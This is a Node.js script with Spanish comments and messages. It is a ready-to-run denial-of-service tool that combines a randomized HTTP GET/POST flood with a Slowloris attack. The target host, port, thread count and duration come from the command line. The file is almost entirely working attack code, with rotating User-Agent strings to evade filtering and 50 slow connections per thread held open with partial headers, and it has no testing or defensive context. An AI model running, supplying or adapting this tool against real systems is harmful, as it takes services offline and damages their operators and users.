// Requiere: npm install axios net

const axios = require('axios');
const net = require('net');

const THREADS = parseInt(process.argv[2]);
const TARGET = process.argv[3];
const PORT = parseInt(process.argv[4]);
const DURATION = parseInt(process.argv[5]);

if (process.argv.length !== 6) {
  console.log('Uso: node script.js <hilos> <host> <puerto> <duracion_seg>');
  process.exit(1);
}

const SCHEME = PORT === 443 ? 'https' : 'http';
const TARGET_URL = `${SCHEME}://${TARGET}`;
const END_TIME = Date.now() + DURATION * 1000;

const USER_AGENTS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
  'Mozilla/5.0 (X11; Linux x86_64)',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
  'Mozilla/5.0 (Windows NT 6.1; WOW64)'
];

function buildHeaders() {
  return {
    'User-Agent': USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)],
    'Accept': '*/*',
    'Connection': 'keep-alive'
  };
}

// Función para ataque Layer7 clásico (requests GET/POST)
async function layer7Attack(threadId) {
  const axiosInstance = axios.create({
    timeout: 3000,
    validateStatus: () => true,
  });

  const paths = ['/', '/api', '/login', '/dashboard', '/register'];

  while (Date.now() < END_TIME) {
    const path = paths[Math.floor(Math.random() * paths.length)] + '?v=' + Math.floor(Math.random() * 1000000);
    const url = `${TARGET_URL}${path}`;
    const method = Math.random() > 0.5 ? 'get' : 'post';

    try {
      if (method === 'get') {
        await axiosInstance.get(url, { headers: buildHeaders() });
      } else {
        await axiosInstance.post(url, { q: Math.floor(Math.random() * 10000) }, { headers: buildHeaders() });
      }
      console.log(`[Layer7-Hilo-${threadId}] Petición enviada (${method.toUpperCase()}) a ${path}`);
    } catch (e) {
      console.log(`[Layer7-Hilo-${threadId}] Error: ${e.message}`);
    }
    await new Promise(r => setTimeout(r, Math.floor(Math.random() * 50) + 20)); // espera entre 20 y 70 ms
  }
}

// Función para ataque Slowloris básico
function slowlorisAttack(threadId) {
  const sockets = [];

  function createSocket() {
    const socket = new net.Socket();

    socket.setTimeout(15000);
    socket.on('timeout', () => {
      socket.destroy();
    });

    socket.on('error', () => {
      socket.destroy();
    });

    socket.connect(PORT, TARGET, () => {
      socket.write(
        `GET /?v=${Math.floor(Math.random() * 1000000)} HTTP/1.1\r\n` +
        `Host: ${TARGET}\r\n` +
        `User-Agent: ${USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)]}\r\n` +
        `Accept: */*\r\n` +
        `Connection: keep-alive\r\n`
      );
      // Enviar datos lentos periódicamente
      const interval = setInterval(() => {
        if (Date.now() > END_TIME) {
          clearInterval(interval);
          socket.end();
          return;
        }
        try {
          socket.write('X-a: b\r\n'); // header incompleto para mantener conexión abierta
        } catch {
          clearInterval(interval);
        }
      }, 15000); // cada 15 segundos
      sockets.push(socket);
    });
  }

  // Abrir muchos sockets
  for (let i = 0; i < 50; i++) { // 50 conexiones lentas por hilo
    createSocket();
  }
}

// Lanzar ataques combinados
for (let i = 0; i < THREADS; i++) {
  layer7Attack(i);
  slowlorisAttack(i);
}

console.log(`\n[INFO] Ataque combinado Layer7 + Slowloris iniciado contra ${TARGET_URL} con ${THREADS} hilos durante ${DURATION} segundos.\n`);
